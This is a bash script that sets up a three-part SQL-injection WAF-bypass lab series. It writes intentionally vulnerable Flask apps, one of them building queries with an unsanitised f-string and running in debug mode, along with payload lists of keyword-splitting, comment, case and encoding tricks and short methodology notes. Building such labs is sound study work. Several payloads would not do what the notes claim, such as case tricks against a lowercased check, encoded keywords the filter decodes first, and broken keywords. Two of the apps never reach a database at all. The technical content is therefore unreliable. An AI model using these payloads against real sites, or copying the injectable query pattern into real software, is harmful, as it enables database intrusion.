#!/usr/bin/env bash
set -e

BASE="/home/karime/portswigger_labs/sqli/02-waf-bypass"

echo "[+] Building SQLi WAF Bypass Series..."
echo "    $BASE"

mkdir -p "$BASE"/{01-keyword-bypass,02-encoding-bypass,03-waf-logic}/
mkdir -p "$BASE"/{01-keyword-bypass,02-encoding-bypass,03-waf-logic}/{vuln,exploit,notes,fix,payloads,db}

# =========================================================
# LAB 1 — KEYWORD FILTER BYPASS
# =========================================================

cat > "$BASE/01-keyword-bypass/README.md" << 'EOF'
# LAB 1 — Keyword Filtering Bypass

## Scenario
WAF blocks:
- SELECT
- UNION
- OR

Goal: bypass using obfuscation.
EOF

cat > "$BASE/01-keyword-bypass/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

BLOCKED = ["select", "union", "or"]

@app.route("/search")
def search():
    q = request.args.get("q", "")

    for w in BLOCKED:
        if w in q.lower():
            return {"blocked": True}

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    query = f"SELECT name FROM products WHERE name = '{q}'"

    try:
        cur.execute(query)
        return {"ok": True}
    except:
        return {"error": "fail"}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/01-keyword-bypass/exploit/payloads.txt" << 'EOF'
# Bypass SELECT

SEL/**/ECT name FROM products

# Bypass UNION

UN/**/ION SELECT NULL--

# Case bypass

SeLeCt name from products

# String concatenation bypass

UNION SELEC||T NULL--
EOF

cat > "$BASE/01-keyword-bypass/notes/methodology.txt" << 'EOF'
FILTER BYPASS STRATEGY:

1. Case variation
2. Inline comments /**/
3. String concatenation
4. Broken keyword splitting
EOF


# =========================================================
# LAB 2 — ENCODING / OBFUSCATION
# =========================================================

cat > "$BASE/02-encoding-bypass/README.md" << 'EOF'
# LAB 2 — Encoding & Obfuscation Bypass
EOF

cat > "$BASE/02-encoding-bypass/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3
import urllib.parse

app = Flask(__name__)

@app.route("/product")
def product():
    q = request.args.get("q", "")

    # naive decode filter
    decoded = urllib.parse.unquote(q)

    if "select" in decoded.lower():
        return {"blocked": True}

    return {"ok": True}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/02-encoding-bypass/exploit/payloads.txt" << 'EOF'
# Double encoding

%53%45%4C%45%43%54

# Inline comment encoding

SE%2F**%2FLECT

# Mixed encoding

UN%49ON SE%4CLECT
EOF

cat > "$BASE/02-encoding-bypass/notes/methodology.txt" << 'EOF'
ENCODING BYPASS:

- URL encode keywords
- double encode
- split encoding across tokens
EOF


# =========================================================
# LAB 3 — WAF LOGIC WEAKNESS
# =========================================================

cat > "$BASE/03-waf-logic/README.md" << 'EOF'
# LAB 3 — WAF Logic Exploitation
EOF

cat > "$BASE/03-waf-logic/vuln/app.py" << 'EOF'
from flask import Flask, request

app = Flask(__name__)

@app.route("/search")
def search():
    q = request.args.get("q", "")

    # weak regex WAF
    blacklist = ["union", "select", "drop"]

    for b in blacklist:
        if b in q.lower():
            return {"blocked": True}

    # but DB still interprets SQL normally
    return {"query": q}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/03-waf-logic/exploit/payloads.txt" << 'EOF'
# bypass via whitespace tricks

UNION%0ASELECT

# tab separation

UNI    ON SEL    ECT

# nested comments

UN/**/ION SE/**/LECT

# keyword splitting

UNI'||'ON SEL'||'ECT
EOF

cat > "$BASE/03-waf-logic/notes/methodology.txt" << 'EOF'
WAF WEAKNESS:

- string match only
- no AST parsing
- no token normalization

EXPLOIT:
break syntax matching but keep SQL valid
EOF


echo "[+] SQLi WAF Bypass Series completed"
